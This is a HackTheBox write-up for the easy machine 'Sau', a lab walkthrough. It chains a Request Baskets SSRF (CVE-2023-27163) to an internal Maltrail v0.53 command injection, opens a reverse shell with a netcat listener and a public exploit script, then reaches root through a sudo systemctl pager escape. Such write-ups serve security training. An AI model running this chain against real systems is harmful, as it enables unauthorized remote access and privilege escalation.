---
title: Sau
date: 2023-10-12
description: Sau | easy | HTB
categories:
- htb-easy
tags:
  - CVE-2023-27163
  - Maltrail
---

Sau is an easy machine from hackthebox which involved exploiting a SSRF vulnerability leading to another service disclosure Maltrail. This service was vulnerable to command injection upon exploiting gave us shell as puma user. Upon further enumeration, systemctl can be run by puma user with root permissions.

<!--more-->

## NMAP SCAN

```bash
# nmap -sC -sV -p- -vv --reason --min-rate=1000 -T4 $ip -oN nmap_tcp_scan

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZ
dSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KH
TPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b30c47fba2f212ccce0b58820e504336 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp filtered http
55555/tcp open  unknown syn-ack
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 02 Oct 2023 02:04:54 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 02 Oct 2023 02:04:20 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 02 Oct 2023 02:04:21 GMT
|_    Content-Length:
```

## Port 55555

```bash
# gobuster dir -u http://10.10.11.224:55555/ -w ~/wordlists/web/raft-medium-directories.txt -t 30 -b 400,404

/test                 (Status: 200) [Size: 0]
/web                  (Status: 200) [Size: 8700]
/Web                  (Status: 301) [Size: 39] [--> /web]
/lab                  (Status: 200) [Size: 0]
```

- Surfing the website we saw that we can create baskets and api calls are being made in the backend

- First searched for *Request Baskets exploit* on google and found a **SSRF** vuln (https://github.com/entr0pie/CVE-2023-27163, https://notes.sjtu.edu.cn/s/MUUhEymt7#)

- It means that we can redirect the output to any other internal open port. During our nmap scan we saw that port 80 is *filtered*

- So to exploit this: `bash ./CVE-2023-27163.sh http://10.10.11.224:55555/ [http://127.0.0.1:80/](http://127.0.0.1/)`

- And we got another page with **Maltrail (v0.53)** **service**

- Looking up on google for Maltrail exploit got one (https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/, https://github.com/spookier/Maltrail-v0.53-Exploit)

- There is a command injection vulnerability in *username* parameter.

- So first we need to create a internal request for **/login** page as said in the above POC.

```bash
bash ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/login
nc -lnvp 8888
python3 exploit.py 10.10.14.81 8888 http://10.10.11.224:55555/rxfgfa
```

- And we get a shell as `puma`

## Enum as puma user

- Doing `sudo -l` we can run *systemctl* command `(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`

- So went to gtfo bins and got exploit for *systemctl:* `sudo /usr/bin/systemctl status trail.service` and then `!bash`

- We get shell as root